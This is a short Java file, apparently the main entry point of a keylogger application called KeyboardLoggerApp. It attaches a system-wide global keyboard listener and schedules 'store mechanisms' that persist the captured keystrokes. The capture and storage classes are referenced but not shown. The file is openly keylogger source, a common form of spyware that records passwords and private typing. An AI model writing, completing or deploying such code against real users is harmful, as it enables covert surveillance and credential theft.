package com.keytracker;


import com.keytracker.storing.StoreMechanism;
import com.keytracker.threads.MechanismsScheduleRunner;
import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyListener;

import java.util.List;

public class KeyboardLoggerApp {
    public static void main(String[] args) {
        KeyTrackerService keyTrackerService = new KeyTrackerService(args);
        KeyListener keyListener = keyTrackerService.getKeyListener();
        List<StoreMechanism> storeMechanisms = keyTrackerService.getStoreMechanisms();

        new GlobalKeyListener().addKeyListener(keyListener);
        new MechanismsScheduleRunner(storeMechanisms).scheduleAll();
    }
}